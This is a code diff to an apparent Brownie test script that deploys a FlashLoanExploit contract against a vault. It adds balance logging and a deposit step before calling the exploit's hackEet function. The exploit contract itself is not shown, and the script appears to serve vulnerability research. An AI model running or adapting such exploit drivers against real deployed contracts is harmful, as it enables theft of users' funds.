@@ -84,10 +84,24 @@ def flash_loan_deposit_hack(setuper):
     token = IERC20(setuper.underlyingTokens(i))
     vault = get_vault_from_setuper(setuper, i)
     exploiter = FlashLoanExploit.deploy(vault, {'from': acc})
+    print('-'*20)
     print(get_formated_token_bals(setuper))
-    tx = exploiter.hackEet({'from': acc}) 
+    print(f'totalSupply: {Web3.fromWei(vault.totalSupply(), "ether")}')
+    print(f'contractBalInVault: {Web3.fromWei(vault.balanceOf(exploiter), "ether")}')
+    tx = exploiter.deposit(
+        {'from': acc, 'value': Web3.toWei(20, 'ether')}
+    )
     tx.wait(1)
+    print('-'*20)
     print(get_formated_token_bals(setuper))
+    print(f'totalSupply: {Web3.fromWei(vault.totalSupply(), "ether")}')
+    print(f'contractBalInVault: {Web3.fromWei(vault.balanceOf(exploiter), "ether")}')
+    tx = exploiter.hackEet({'from': acc})
+    tx.wait(1)
+    print('-'*20)
+    print(get_formated_token_bals(setuper))
+    print(f'totalSupply: {Web3.fromWei(vault.totalSupply(), "ether")}')
+    print(f'contractBalInVault: {Web3.fromWei(vault.balanceOf(exploiter), "ether")}')
 
 
 def main():
